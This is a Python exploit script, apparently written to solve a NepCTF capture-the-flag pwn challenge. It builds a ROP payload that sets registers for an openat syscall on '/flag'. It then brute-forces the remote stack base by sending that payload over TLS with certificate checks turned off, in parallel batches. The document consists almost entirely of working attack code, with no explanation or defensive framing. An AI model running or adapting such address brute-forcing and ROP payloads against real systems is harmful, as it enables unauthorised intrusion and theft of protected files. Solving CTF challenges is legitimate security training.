#!/usr/bin/env python3
"""Fast batch brute-force for remote stack base."""
import socket, ssl, struct, time, sys, concurrent.futures

HOST = "fpztdaff-m4sy-lecb-yh9e-6a5acab230525-neptunus.nepctf.com"
PORT = 443
SYS_OPENAT = 56
AT_FDCWD = 0xFFFFFF9C
TRAP0 = 0x2ba08
RESTART = 0x21168

def build_note1(base):
    note = bytearray(64)
    struct.pack_into('<I', note, 4, 0)      # R5
    struct.pack_into('<I', note, 8, 0)      # R4
    struct.pack_into('<I', note, 12, 0)     # R3
    struct.pack_into('<I', note, 16, 0)     # R2
    struct.pack_into('<I', note, 20, base + 32) # R1 = "/flag"
    struct.pack_into('<I', note, 24, AT_FDCWD)  # R0
    struct.pack_into('<I', note, 28, SYS_OPENAT) # R6
    note[32:38] = b'/flag\x00'
    struct.pack_into('<I', note, 48, base + 56)  # R30_first
    struct.pack_into('<I', note, 52, TRAP0)       # R31_first
    struct.pack_into('<I', note, 56, base + 56)   # R30_after
    struct.pack_into('<I', note, 60, RESTART)      # R31_after
    return note

def test_base(base):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ssock = ctx.wrap_socket(sock, server_hostname=HOST)
        ssock.connect((HOST, PORT))

        data = b''
        ssock.settimeout(2)
        while b'> ' not in data:
            try:
                data += ssock.recv(4096)
            except:
                break

        note1 = build_note1(base)
        ssock.send(b'3\n' + bytes(note1) + b'\n')

        data = b''
        ssock.settimeout(3)
        while b'ROP Register Lab' not in data:
            try:
                chunk = ssock.recv(4096)
                if not chunk:
                    break
                data += chunk
            except:
                break
        ssock.close()

        if b'ROP Register Lab' in data:
            return (base, True, len(data))
        return (base, False, len(data))
    except:
        return (base, False, 0)

# Generate candidate bases
candidates = []

# 1. Near local base (0x4080e4c0) — most likely
for off in range(-0x1000, 0x1000, 0x10):
    candidates.append(0x4080e4c0 + off)

# 2. Common QEMU stack regions
for region_base in [0x40800000, 0x40700000, 0x40900000, 0x40008000]:
    for off in range(0, 0x2000, 0x10):
        candidates.append(region_base + off)

# Deduplicate and filter: base + 48 should be 4-byte aligned
unique = []
seen = set()
for c in candidates:
    if c not in seen and (c & 0xF) == 0:  # base must be 16-byte aligned for stack
        seen.add(c)
        unique.append(c)

print(f"[*] Testing {len(unique)} addresses with 4 parallel connections...")

found = None
# Test in parallel batches
batch_size = 4
for batch_start in range(0, len(unique), batch_size):
    batch = unique[batch_start:batch_start + batch_size]

    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
        futures = [executor.submit(test_base, b) for b in batch]
        for f in concurrent.futures.as_completed(futures):
            base, ok, sz = f.result()
            if ok:
                print(f"\n*** SUCCESS! base = 0x{base:08x} (response: {sz}B) ***")
                found = base
                break
    if found:
        break

    # Print progress
    if (batch_start // batch_size) % 100 == 0:
        last = batch[-1]
        print(f"  [{batch_start}/{len(unique)}] last tried: 0x{last:08x}")

if found:
    print(f"\n[*] Remote note base: 0x{found:08x}")
else:
    print(f"\n[*] No match found in {len(unique)} addresses")
    # Try a single test to confirm connectivity
    base, ok, sz = test_base(0x4080e4c0)
    print(f"[*] Local base 0x4080e4c0: {'OK' if ok else 'FAIL'} ({sz}B)")
